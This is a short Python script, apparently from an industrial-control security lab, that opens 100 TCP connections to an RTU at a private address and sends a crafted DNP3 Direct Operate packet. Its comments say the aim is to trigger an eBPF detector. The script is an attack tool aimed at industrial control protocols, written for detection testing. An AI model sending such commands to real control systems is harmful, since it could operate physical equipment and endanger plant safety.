#!/usr/bin/env python3
"""
Step 2: External E2E Pivot Attack Module (Genuine TCP Socket Version)

目的:
1. モック(tee注入)やAPI自己申告(Webdisへの直接アクセス)を完全に排除。
2. Pythonの標準socketモジュールを使用し、実際に 10.0.30.10:20000 へ TCP接続を確立する。
3. これによりカーネル層で tcp_connect が発動し、eBPF (tx_prog.bpf.c) が客観的に捕捉・判定する。
"""

import socket
import time
import sys

TARGET_IP = "10.0.30.10"
TARGET_PORT = 20000
ATTACK_COUNT = 100

# DNP3 FC 0x05 (Direct Operate) 模造ペイロード
DNP3_PAYLOAD = b"\x05\x64\x05\xc0\x01\x00\x00\x04\x05\x00\x00\x00\x00"

def execute_real_attack():
    print(f"[+] Starting GENUINE TCP Socket Attack to {TARGET_IP}:{TARGET_PORT}")
    print("[!] Notice: No OOB API calls (self-reporting) are made by this script.")
    
    success_count = 0
    for i in range(ATTACK_COUNT):
        try:
            # 毎回新しいソケットを作成し、eBPFの tcp_connect フックを確実に発火させる
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            
            # 本物のTCP 3-Way Handshake
            s.connect((TARGET_IP, TARGET_PORT))
            
            # 本物のペイロード送出
            s.sendall(DNP3_PAYLOAD)
            
            s.close()
            success_count += 1
            time.sleep(0.01)
            
        except ConnectionRefusedError:
            # 宛先ポートが閉じていてもSYNは出ているためeBPFはフックするが、DNP3としては不成立
            print(f"    [-] Connection Refused on strike {i+1}")
        except Exception as e:
            print(f"    [-] Strike {i+1} error: {e}")

    print(f"[+] E2E Pivot Attack Execution Complete. Successful connections: {success_count}/{ATTACK_COUNT}")
    if success_count == 0:
        print("[!] Warning: All connections failed. Is the RTU listening on port 20000?")
        sys.exit(1)

if __name__ == "__main__":
    execute_real_attack()
